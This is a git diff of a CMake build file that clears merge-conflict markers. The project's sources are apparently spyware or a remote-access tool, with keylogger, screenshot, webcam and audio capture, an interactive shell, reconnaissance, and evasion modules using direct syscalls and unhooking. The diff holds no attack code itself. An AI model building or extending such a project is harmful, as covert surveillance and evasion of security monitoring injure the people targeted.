@@ -46,16 +46,11 @@ add_executable(main
     src/capture/Screenshot.cpp
     src/capture/Keylogger.cpp
     src/capture/Audio.cpp
-<<<<<<< HEAD
-=======
-    src/capture/Audio.cpp
->>>>>>> 68f7affb5880fa8c91159abe3758b8e0be161009
     src/capture/Webcam.cpp
     src/streaming/Streamer.cpp
     src/shell/InteractiveShell.cpp
     src/fs/FileSystem.cpp
     src/recon/DeepRecon.cpp
-<<<<<<< HEAD
     src/evasion/Syscalls.cpp
     src/evasion/SyscallStub.asm
     src/evasion/Unhooker.cpp
@@ -87,11 +82,3 @@ add_custom_command(TARGET unit_tests POST_BUILD
     COMMAND unit_tests
     WORKING_DIRECTORY ${CMAKE_CURRENT_BINARY_DIR}
 )
-=======
-    # Expecting user to provide sqlite3.c in external/sqlite/
-    # external/sqlite/sqlite3.c 
-)
-
-target_include_directories(main PUBLIC external external/sqlite)
-target_link_libraries(main bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32)
->>>>>>> 68f7affb5880fa8c91159abe3758b8e0be161009
